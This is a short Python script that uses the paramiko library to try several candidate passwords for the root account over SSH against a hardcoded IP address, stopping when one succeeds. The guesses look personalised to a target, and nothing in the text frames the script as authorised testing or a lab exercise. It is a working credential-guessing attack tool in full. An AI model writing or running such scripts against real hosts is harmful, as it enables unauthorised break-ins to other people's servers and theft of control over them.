import paramiko

def check_ssh_password(host, port, user, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(host, port=port, username=user, password=password, timeout=5)
        print(f"SUCCESS: {password}")
        return True
    except Exception as e:
        print(f"FAILED: {password} - {e}")
        return False
    finally:
        client.close()

if __name__ == '__main__':
    host = '169.58.49.5'
    user = 'root'
    passwords = [
        "3377274",
        "Ferrari3377274",
        "F3377274"
    ]
    
    for pwd in passwords:
        if check_ssh_password(host, 22, user, pwd):
            break
